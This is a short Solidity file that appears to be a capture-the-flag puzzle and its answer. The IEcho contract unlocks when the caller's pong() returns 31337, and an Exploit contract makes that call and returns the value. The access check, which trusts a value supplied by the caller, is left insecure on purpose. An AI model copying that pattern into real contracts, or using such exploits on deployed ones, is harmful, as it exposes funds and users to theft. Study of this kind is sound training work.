pragma solidity 0.8.19;

interface IRecipient {
    function pong() external view returns (uint256);
}

contract IEcho {
    bool public unlocked;

    function ping() external {
        uint256 code = IRecipient(msg.sender).pong(); 
        require(code == 31337, "incorrect code");
        unlocked = true;
    }
}


contract Exploit {
    address target;
    constructor(address targetAddress) payable {
        target = targetAddress;
    }

    function attack() external {
        IEcho ie = IEcho(target);
        ie.ping();
    }
    
    function pong() external returns(uint256) {
        return 31337;
    }
}
